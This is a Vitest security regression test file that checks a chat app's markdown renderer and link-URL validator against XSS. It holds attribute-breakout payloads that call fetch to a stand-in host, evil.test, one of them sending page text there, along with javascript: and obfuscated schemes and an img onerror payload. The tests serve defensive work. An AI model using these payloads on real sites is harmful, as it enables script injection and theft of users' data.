/**
 * Security regression tests for utils.js rendering helpers.
 *
 * Message bodies are model output and are inserted with innerHTML
 * (messages.js renderMarkdown path, chat.js edit/regenerate paths). The
 * app is served same-origin with the API and has no auth, so script
 * execution here is equivalent to full API control - these cases must
 * stay closed.
 */

import { describe, it, expect } from 'vitest';
import { escapeHtml, isSafeLinkUrl, renderMarkdown } from '../modules/utils.js';

/** Parse rendered HTML and return the first anchor, if any. */
function renderToAnchor(markdown) {
    const div = document.createElement('div');
    div.innerHTML = renderMarkdown(markdown);
    return div.querySelector('a');
}

/** Every event-handler attribute present anywhere in the rendered output. */
function eventHandlerAttributes(markdown) {
    const div = document.createElement('div');
    div.innerHTML = renderMarkdown(markdown);
    const found = [];
    for (const el of div.querySelectorAll('*')) {
        for (const attr of el.attributes) {
            if (/^on/i.test(attr.name) || attr.name.toLowerCase() === 'autofocus') {
                found.push(attr.name);
            }
        }
    }
    return found;
}

describe('escapeHtml', () => {
    it('escapes angle brackets and ampersands', () => {
        expect(escapeHtml('<script>')).toBe('&lt;script&gt;');
        expect(escapeHtml('a & b')).toBe('a &amp; b');
    });

    it('escapes quotes so output is safe inside an attribute value', () => {
        expect(escapeHtml('"')).toBe('&quot;');
        expect(escapeHtml("'")).toBe('&#39;');
        expect(escapeHtml('" onmouseover="x')).not.toContain('"');
    });
});

describe('isSafeLinkUrl', () => {
    it('allows http, https and mailto', () => {
        expect(isSafeLinkUrl('https://example.com/a?b=c')).toBe(true);
        expect(isSafeLinkUrl('http://example.com')).toBe(true);
        expect(isSafeLinkUrl('mailto:someone@example.com')).toBe(true);
    });

    it('allows document-relative targets', () => {
        expect(isSafeLinkUrl('/docs/page')).toBe(true);
        expect(isSafeLinkUrl('./page')).toBe(true);
        expect(isSafeLinkUrl('../page')).toBe(true);
        expect(isSafeLinkUrl('#section')).toBe(true);
        expect(isSafeLinkUrl('?q=1')).toBe(true);
        expect(isSafeLinkUrl('page.html')).toBe(true);
    });

    it('rejects script-capable and unknown schemes', () => {
        expect(isSafeLinkUrl('javascript:alert(1)')).toBe(false);
        expect(isSafeLinkUrl('JaVaScRiPt:alert(1)')).toBe(false);
        expect(isSafeLinkUrl('data:text/html;base64,PHN2Zz4=')).toBe(false);
        expect(isSafeLinkUrl('vbscript:msgbox')).toBe(false);
        expect(isSafeLinkUrl('file:///etc/passwd')).toBe(false);
    });

    it('rejects schemes hidden behind control characters', () => {
        expect(isSafeLinkUrl('java\tscript:alert(1)')).toBe(false);
        expect(isSafeLinkUrl('  javascript:alert(1)')).toBe(false);
        expect(isSafeLinkUrl('java\nscript:alert(1)')).toBe(false);
    });

    it('rejects protocol-relative URLs', () => {
        expect(isSafeLinkUrl('//evil.example.com/x')).toBe(false);
    });

    it('rejects empty input', () => {
        expect(isSafeLinkUrl('')).toBe(false);
        expect(isSafeLinkUrl(undefined)).toBe(false);
    });
});

describe('renderMarkdown link handling', () => {
    it('does not let a link URL break out of the href attribute', () => {
        // Backticks avoid the ")" that terminates the URL capture group,
        // so this payload needs no parentheses to reach a working handler.
        const payload =
            '[hover me](" onmouseover="fetch`https://evil.test/`+document.body.innerText")';

        // The payload must not become a separate event-handler attribute,
        // whether it survives as inert href text or is dropped entirely.
        expect(eventHandlerAttributes(payload)).toEqual([]);
    });

    it('does not emit autofocus/onfocus handlers from a link URL', () => {
        const payload = '[x](" autofocus onfocus="fetch`https://evil.test/`")';
        expect(eventHandlerAttributes(payload)).toEqual([]);
    });

    it('rejects a URL carrying markup injected by an earlier markdown rule', () => {
        // The inline-code rule runs before the link rule, so backticks inside
        // the URL inject a real <code class="..."> tag whose quote would
        // otherwise close the href attribute.
        const payload = '[x](https://a.test/`b`)';
        expect(eventHandlerAttributes(payload)).toEqual([]);
        expect(renderToAnchor(payload)).toBeNull();
    });

    it('renders a javascript: link as literal text, not an anchor', () => {
        const payload = '[click](javascript:alert`1`)';
        expect(renderToAnchor(payload)).toBeNull();
        expect(renderMarkdown(payload)).not.toMatch(/href="javascript:/i);
    });

    it('still renders ordinary links', () => {
        const anchor = renderToAnchor('[Anthropic](https://www.anthropic.com/research)');
        expect(anchor).not.toBeNull();
        expect(anchor.getAttribute('href')).toBe('https://www.anthropic.com/research');
        expect(anchor.textContent).toBe('Anthropic');
        expect(anchor.getAttribute('rel')).toBe('noopener noreferrer');
    });

    it('does not execute markup smuggled through other markdown constructs', () => {
        const html = renderMarkdown('**<img src=x onerror=alert(1)>**');
        expect(html).not.toContain('<img');
        expect(html).toContain('&lt;img');
    });
});
